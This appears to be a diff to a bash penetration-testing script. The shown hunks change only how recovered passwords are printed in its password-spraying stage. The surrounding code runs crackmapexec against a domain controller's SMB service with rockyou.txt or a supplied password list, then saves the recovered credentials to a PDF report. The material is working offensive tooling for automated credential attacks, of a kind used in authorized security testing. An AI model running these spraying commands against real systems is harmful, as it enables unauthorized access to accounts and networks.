@@ -656,7 +656,7 @@ if [ -z $adusr ]		#Checks if a user credential was given. Propmts the user and r
                 	echo -e "\n$cyan[*]$endcolor$yellow Performing a Password Spraying attack while using rockyou.txt...$endcolor"
 			cp /usr/share/wordlists/rockyou.txt.gz ./rockyou.txt.gz ; gunzip ./rockyou.txt.gz	#Rockyou.txt recovery to be used as the password list
 			crackmapexec smb $dcip -u $adusr -p ./rockyou.txt --continue-on-success > spray
-			echo -e "$cyan[+]$endcolor$blue Recovered passwords: $green\n$(cat spray | grep [+])$endcolor"
+			echo -e "$cyan[+]$endcolor$blue Recovered passwords: $green\n$(cat spray | grep [+] | awk '{print $6 $7}')$endcolor"
 			rm ./rockyou.txt			#Rockyou.txt removed after attack is concluded
 			echo -e "$blue[+] Saving Data...$endcolor\n"
 	                enscript spray -p Inter_Spray 2>/dev/null
@@ -671,7 +671,7 @@ if [ -z $adusr ]		#Checks if a user credential was given. Propmts the user and r
                 	echo -e "\n$cyan[*]$endcolor$yellow Performing a Password Spraying attack while using rockyou.txt...$endcolor"
 			cp /usr/share/wordlists/rockyou.txt.gz ./rockyou.txt.gz ; gunzip ./rockyou.txt.gz
                 	crackmapexec smb $dcip -u $adusr -p ./rockyou.txt --continue-on-success > spray
-			echo -e "$cyan[+]$endcolor$blue Recovered passwords: $green\n$(cat spray | grep [+])$endcolor"
+			echo -e "$cyan[+]$endcolor$blue Recovered passwords: $green\n$(cat spray | grep [+] | awk '{print $6 $7}')$endcolor"
 			rm ./rockyou.txt
                 	echo -e "$blue[+] Saving Data...$endcolor\n"
                         enscript spray -p Inter_Spray 2>/dev/null
@@ -697,7 +697,7 @@ if [ -z $adusr ]		#Checks if a user credential was given. Propmts the user and r
                 			fi
 				echo -e "\n$cyan[*]$endcolor$yellow Performing a Password Spraying attack while using given password list...$endcolor"
                 		crackmapexec smb $dcip -u $adusr -p $list --continue-on-success > spray
-				echo -e "$cyan[+]$endcolor$blue Recovered passwords: $green\n$(cat spray | grep [+])$endcolor"
+				echo -e "$cyan[+]$endcolor$blue Recovered passwords: $green\n$(cat spray | grep [+] | awk '{print $6 $7}')$endcolor"
                 		echo -e "$blue[+] Saving Data...$endcolor\n"
                 		enscript spray -p Inter_Spray 2>/dev/null
                 		ps2pdf Inter_Spray Intermediate_Exploitation_$dcip.pdf 2>/dev/null
@@ -709,7 +709,7 @@ if [ -z $adusr ]		#Checks if a user credential was given. Propmts the user and r
 
 				echo -e "\n$cyan[*]$endcolor$yellow Performing a Password Spraying attack while using given password list...$endcolor"
 	        		crackmapexec smb $dcip -u $adusr -p $list --continue-on-success > spray
-				echo -e "$cyan[+]$endcolor$blue Recovered passwords: $green\n$(cat spray | grep [+])$endcolor"
+				echo -e "$cyan[+]$endcolor$blue Recovered passwords: $green\n$(cat spray | grep [+] | awk '{print $6 $7}')$endcolor"
         			echo -e "$blue[+] Saving Data...$endcolor\n"
                 		enscript spray -p Inter_Spray 2>/dev/null
                 		ps2pdf Inter_Spray Intermediate_Exploitation_$dcip.pdf 2>/dev/null
